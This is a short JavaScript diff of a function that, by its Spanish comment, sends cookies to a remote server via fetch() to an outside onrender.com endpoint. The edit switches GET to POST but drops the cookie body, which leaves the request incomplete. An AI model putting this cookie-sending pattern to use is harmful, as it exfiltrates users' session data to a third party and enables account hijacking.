@@ -7,13 +7,11 @@
 
         //Enviar cookies al servidor
         fetch("https://testnode-vo76.onrender.com/cookies",{
-            method: 'GET',
+            method: 'POST',
             headers: {
                'Content-Type': 'application/json', 
-            },
-            body: JSON.stringify({cookies})
+            }
         })
-        .then(response => response.json())
         .then(data => console.log(data))
         .catch(error => console.error('Error:', error));
     }
